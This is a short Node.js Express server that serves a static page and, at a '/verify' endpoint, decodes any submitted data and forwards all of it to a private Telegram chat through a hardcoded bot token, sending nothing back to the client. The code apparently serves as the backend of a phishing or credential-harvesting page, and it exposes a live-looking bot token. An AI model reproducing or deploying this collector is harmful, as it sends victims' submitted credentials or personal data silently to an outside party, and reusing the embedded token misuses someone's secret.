const express = require('express')
const cors = require('cors')
const app = express()
const path = require('path')
const bodyParser = require('body-parser')
const axios = require('axios')

app.use(bodyParser.text())
app.use(express.json())
app.use(cors())

app.use(express.static(path.join(__dirname, 'public')))

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'))
})

app.post('/verify', (req, res) => {
    const decodedData = atob(req.body)
    const jsonData = JSON.parse(decodedData)

    const token = '7162361678:AAFYurkXq1LDEQK9_BWYjLZVe3odRhhcCg4'
    const chatId = 5641960649
    const text = decodedData

    axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: chatId,
        text: text
    })
    .then(response => {
        console.log('Message sent:', response.data)
    })
    .catch(error => {
        console.error('Error sending message:', error)
    })
})

app.listen(3000, () => {
    console.log('Server running on port 3000')
})